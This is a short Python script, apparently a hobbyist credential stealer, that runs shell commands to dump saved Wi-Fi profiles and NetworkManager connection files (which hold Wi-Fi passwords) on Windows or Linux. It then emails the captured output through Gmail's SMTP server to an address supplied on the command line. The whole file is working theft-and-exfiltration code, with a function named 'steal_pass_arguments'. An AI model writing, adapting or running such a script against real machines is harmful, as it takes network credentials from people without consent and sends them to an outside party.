import subprocess, smtplib , re , optparse

result = ''

#funciton to send info to email

def send_email(email, password, message):
    email_server = smtplib.SMTP('smtp.gmail.com', 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email,email , message)
    email_server.quit()


def steal_pass_arguments():
    parse = optparse.OptionParser()
    parse.add_option('-e', '--email', dest='email',help='used to specify email address')
    parse.add_option('-p', '--password',dest='password' ,help='used to specify password')
    parse.add_option('-o',dest='command', help=' choose diffrent commands for diffrent Os"s')
    (option, arguments) = parse.parse_args()
    global result

    if option.command: 
        if option.command =='windows':
            #windows systems
            command = 'netsh wlan show profiles'
            result = subprocess.check_output(command, shell=True)
            print('hello')
            return (option, arguments) 
        elif option.command == 'linux':
            #linux based systems
            command = 'cat /etc/NetworkManager/system-connections/*'
            result  = subprocess.check_output(command, shell=True)
            print(result)
            return (option, arguments) 
        elif option.command == 'mac':
            #mac based system
            command = 'cat /Users/hamu/test-file'
            result = subprocess.check_output(command, shell=True)
            print(result)
            return (option, arguments) 
        
    else:
        parse.error('[-] error no arguments were choosen')

(option, arguments) = steal_pass_arguments()

send_email(option.email, option.password,result )